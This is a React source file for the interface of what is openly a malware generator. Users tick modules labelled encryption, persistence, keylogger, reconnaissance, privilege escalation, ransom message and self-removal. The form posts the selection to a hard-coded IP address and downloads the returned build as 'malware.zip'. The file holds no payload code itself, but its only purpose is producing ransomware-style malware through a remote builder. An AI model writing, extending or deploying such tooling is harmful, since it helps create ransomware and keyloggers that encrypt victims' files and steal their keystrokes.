import React, { useState, useEffect } from "react";
import { InputGroup, Container, Form, Button } from "react-bootstrap";
import axios from "axios";
function GeneratorScreen() {
  const [Encrption, setEncrption] = useState(false);
  const [Persistence, setPersistence] = useState(false);
  const [Keylogger, setKeylogger] = useState(false);
  const [Recon, setRecon] = useState(false);
  const [Privileges, setPrivileges] = useState(false);
  const [RansomMessage, setRansomMessage] = useState(false);
  const [SelfRemove, setSelfRemove] = useState(false);

  const submitHandler = async (e) => {
    e.preventDefault();
    const modules = [];
    if (Encrption) {
      const m = { type: "encrypt" };
      modules.push(m);
    }
    if (Persistence) {
      const m = { type: "persistence" };
      modules.push(m);
    }
    if (Keylogger) {
      const m = { type: "keylogger" };
      modules.push(m);
    }
    if (Recon) {
      const m = { type: "reconnaissance" };
      modules.push(m);
    }
    if (Privileges) {
      const m = { type: "privilege" };
      modules.push(m);
    }
    const json = { modules: modules };
    console.log(json);
    axios
      .post("http://159.20.87.203:8000/api/create/", json, {
        responseType: "arraybuffer",
        headers: {
          "Content-Type": "application/json",
        },
      })
      .then((response) => {
        const type = response.headers["content-type"];
        const blob = new Blob([response.data], {
          type: type,
          encoding: "UTF-8",
        });
        const link = document.createElement("a");
        link.href = window.URL.createObjectURL(blob);
        link.download = "malware.zip";
        link.click();
      });
  };
  return (
    <Form onSubmit={submitHandler}>
      <Container>
        <InputGroup>
          <InputGroup.Checkbox
            checked={Encrption}
            onChange={(e) => setEncrption(e.target.checked)}
          />
          <p1>Encrption</p1>
          <InputGroup.Checkbox
            checked={Persistence}
            onChange={(e) => setPersistence(e.target.checked)}
          />
          <p1>Persistence</p1>
          <InputGroup.Checkbox
            checked={Keylogger}
            onChange={(e) => setKeylogger(e.target.checked)}
          />
          <p1>Keylogger</p1>
          <InputGroup.Checkbox
            checked={Recon}
            onChange={(e) => setRecon(e.target.checked)}
          />
          <p1>Recon</p1>
          <InputGroup.Checkbox
            checked={Privileges}
            onChange={(e) => setPrivileges(e.target.checked)}
          />
          <p1>Privilege</p1>
          <InputGroup.Checkbox
            checked={RansomMessage}
            onChange={(e) => setRansomMessage(e.target.checked)}
          />
          <p1>RansomMessage</p1>
          <InputGroup.Checkbox
            checked={SelfRemove}
            onChange={(e) => setSelfRemove(e.target.checked)}
          />
          <p1>SelfRemove</p1>
        </InputGroup>
      </Container>
      <Button type="submit" variant="primary">
        Update
      </Button>
    </Form>
  );
}

export default GeneratorScreen;
